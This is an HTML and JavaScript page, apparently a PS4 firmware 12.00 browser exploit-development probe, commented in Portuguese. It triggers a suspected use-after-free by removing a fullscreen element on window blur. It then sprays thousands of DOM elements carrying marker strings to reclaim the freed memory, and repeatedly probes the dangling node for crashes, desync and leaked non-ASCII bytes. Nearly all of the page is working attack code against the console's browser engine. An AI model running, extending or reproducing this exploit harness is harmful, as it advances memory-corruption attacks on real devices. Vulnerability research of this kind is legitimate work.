<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 12.00 - UAF Leak Deep Scan</title>
</head>
<body style="background:#111;color:#0f0;font-family:monospace;">

<h2>UAF Leak Deep Scan (Desync + Raw Scan)</h2>
<button onclick="runTest()">Run Test</button>

<script>

// ==========================
// 🔒 LOG SEGURO
// ==========================
let logBuffer = [];
function log(msg){
    try{console.log(msg);}catch(e){}
    logBuffer.push(msg);
}

// ==========================
// 💣 HEAP PRIMING (1 ARRAY)
// ==========================
function setupHeap(){
    let t = new Float64Array(8);
    t[0] = 0x1337;
    window.__priming_array = t;

    log("[*] heap primed (1 array)");
}

// ==========================
// FULLSCREEN
// ==========================
function setupFullscreen(){

    let fsTarget = document.createElement("div");

    fsTarget.innerHTML =
        "<h1 style='margin-top:20%;text-align:center;'>FULLSCREEN ACTIVE<br>Press OPTIONS</h1>";

    Object.assign(fsTarget.style,{
        background:"black",
        width:"100%",
        height:"100%",
        position:"absolute",
        top:"0",
        left:"0"
    });

    document.body.appendChild(fsTarget);
    fsTarget.webkitRequestFullscreen?.();

    return fsTarget;
}

// ==========================
// 💣 MONOTYPE RECLAIM
// ==========================
function preciseReclaim(size){

    log("[*] Reclaim size = "+size);

    let bucket = [];

    // churn
    for(let i=0;i<1500;i++){
        let el=document.createElement("div");
        document.body.appendChild(el);
        el.remove();
    }

    // spray homogêneo
    for(let i=0;i<size;i++){

        let el = document.createElement("div");

        el.innerHTML =
            "<h1 style='margin-top:20%;text-align:center;'>CTRL_"+i+"_41414141_42424242_43434343</h1>";

        Object.assign(el.style,{
            background:"black",
            width:"100%",
            height:"100%",
            position:"absolute",
            top:"0",
            left:"0"
        });

        document.body.appendChild(el);
        bucket.push(el);
    }

    return bucket;
}

// ==========================
// 🔬 PROBE + LEAK PROFUNDO
// ==========================
function deepProbe(fsTarget){

    log("---- PROBE ----");

    // ==========================
    // DESYNC
    // ==========================
    try{
        let html = fsTarget.innerHTML;
        let text = fsTarget.textContent;

        log("[CHECK] innerHTML = "+html);
        log("[CHECK] textContent = "+text);

        if(html && text && !html.includes(text)){
            log("[!!!] DESYNC REAL DETECTADO");
        }

    }catch(e){
        log("[UAF] innerHTML/text crash");
    }

    // ==========================
    // CHILD INFO
    // ==========================
    try{
        let child = fsTarget.firstChild;
        log("[CHECK] child = "+child);
        log("[CHECK] nodeType = "+child?.nodeType);
    }catch(e){
        log("[UAF] child crash");
    }

    // ==========================
    // WRITE CONTROL
    // ==========================
    try{
        fsTarget.innerHTML =
            "<div id='x'>" +
            "BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB" +
            "</div>";

        log("[PWN] write OK");
    }catch(e){
        log("[UAF] write crash");
    }

    // ==========================
    // 🔥 LEAK EXPANDIDO
    // ==========================
    try{
        let html = fsTarget.innerHTML;
        let expanded = html.repeat(50);

        log("[LEAK+] len = " + expanded.length);
        log("[LEAK+] preview = " + expanded.substring(0,120));

        let weird = [];

        for(let i=0;i<expanded.length;i++){
            let c = expanded.charCodeAt(i);

            // fora de ASCII visível
            if(c < 32 || c > 126){
                weird.push(c);
            }
        }

        if(weird.length > 0){
            log("[!!!] BYTES NÃO ASCII: " + weird.slice(0,20));
        }else{
            log("[SCAN] apenas ASCII visível");
        }

    }catch(e){
        log("[LEAK] erro scan profundo");
    }

    // ==========================
    // 🔬 RAW CHARCODE DUMP
    // ==========================
    try{
        let raw = fsTarget.innerHTML;
        let slice = raw.substring(0, 500);

        let codes = [];

        for(let i=0;i<slice.length;i++){
            codes.push(slice.charCodeAt(i));
        }

        log("[RAW] charCodes = " + codes.slice(0,60));

    }catch(e){
        log("[RAW] erro leitura");
    }

    // ==========================
    // OUTROS CHECKS
    // ==========================
    try{
        let r = fsTarget.getBoundingClientRect();
        log("[CHECK] rect = "+r.height);
    }catch(e){
        log("[UAF] rect crash");
    }

    try{
        let p = fsTarget.parentNode;
        log("[CHECK] parent = "+p);
    }catch(e){
        log("[UAF] parent crash");
    }
}

// ==========================
// TRIGGER
// ==========================
function trigger(fsTarget){

    log("[*] Trigger");

    try{
        fsTarget.remove();

        if(document.webkitIsFullScreen || document.fullscreenElement){
            document.webkitExitFullscreen?.();
        }

    }catch(e){}

    let sizes = [2000, 2200, 2500];

    sizes.forEach((size, idx)=>{
        setTimeout(()=>preciseReclaim(size), idx*60);
    });

    setTimeout(()=>deepProbe(fsTarget), 10);
    setTimeout(()=>deepProbe(fsTarget), 40);
    setTimeout(()=>deepProbe(fsTarget), 80);
    setTimeout(()=>deepProbe(fsTarget), 140);
    setTimeout(()=>deepProbe(fsTarget), 220);

    setTimeout(()=>{
        alert(logBuffer.join("\n"));
    },400);

    setTimeout(()=>location.reload(),600);
}

// ==========================
// MAIN
// ==========================
function runTest(){

    log("[*] Iniciando teste");

    setupHeap();

    let fsTarget = setupFullscreen();

    window.onblur = function(){
        log("[*] onblur");
        setTimeout(()=>trigger(fsTarget),3000);
    };
}

</script>

</body>
</html>
